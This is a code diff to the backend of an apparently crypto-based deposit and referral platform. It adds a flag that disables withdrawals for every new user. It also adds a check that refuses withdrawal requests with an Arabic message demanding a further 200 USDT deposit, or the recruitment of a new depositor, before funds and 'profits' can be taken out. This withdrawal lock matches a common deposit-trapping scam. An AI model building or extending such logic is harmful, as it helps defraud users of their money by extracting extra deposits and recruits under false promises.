@@ -283,6 +283,10 @@ const UserSchema = new mongoose.Schema(
       type: Number,
       default: 0
     },
+    withdrawalEnabled: {
+      type: Boolean,
+      default: false
+    },
     referredUsers: [
       {
         email: String,
@@ -378,6 +382,7 @@ function publicUser(user) {
     referralCode: user.referralCode,
     referredBy: user.referredBy,
     referralBonus: Number(user.referralBonus || 0),
+    withdrawalEnabled: user.withdrawalEnabled || false,
     referredUsers: user.referredUsers || [],
     transactions: user.transactions || [],
     createdAt: user.createdAt
@@ -657,6 +662,7 @@ app.post("/api/register", async (req, res) => {
       referralCode: referralCodeGenerated,
       referredBy: null,
       referralBonus: 0,
+      withdrawalEnabled: false,
       referredUsers: [],
       transactions: []
     });
@@ -1184,7 +1190,7 @@ app.post("/api/admin/balance", async (req, res) => {
 });
 
 // =========================================================
-//  SUBMIT WITHDRAWAL REQUEST (FROM USER)
+//  SUBMIT WITHDRAWAL REQUEST (FROM USER) - WITH ACTIVATION CHECK
 // =========================================================
 
 app.post("/api/withdraw", async (req, res) => {
@@ -1211,6 +1217,16 @@ app.post("/api/withdraw", async (req, res) => {
     const currentBalance = Number(user.balance || 0);
     if (currentBalance < amount) {
       return res.status(400).json({ success: false, message: `❌ الرصيد غير كافٍ. رصيدك: $${currentBalance.toFixed(2)}` });
+    }
+
+    // =========================================================
+    // CHECK: WITHDRAWAL ENABLED
+    // =========================================================
+    if (!user.withdrawalEnabled) {
+      return res.status(403).json({
+        success: false,
+        message: "🔐 لتمكين خاصية السحب، يُرجى اتباع أحد الخيارين التاليين: 1️⃣ دعوة مستخدم جديد يقوم بإيداع مبلغ لا يقل عن 200 USDT. 2️⃣ أو إيداع 200 USDT بشكل شخصي لتفعيل الحساب. ✅ بعد ذلك سيتم تفعيل السحب، وستتمكنون من سحب المبلغ مع الأرباح. 📌 تنويه هام: يمكنكم سحب مبلغ 200 USDT الذي تم إيداعه لتفعيل خاصية السحب، وذلك بشكل مباشر."
+      });
     }
 
     // خصم الرصيد
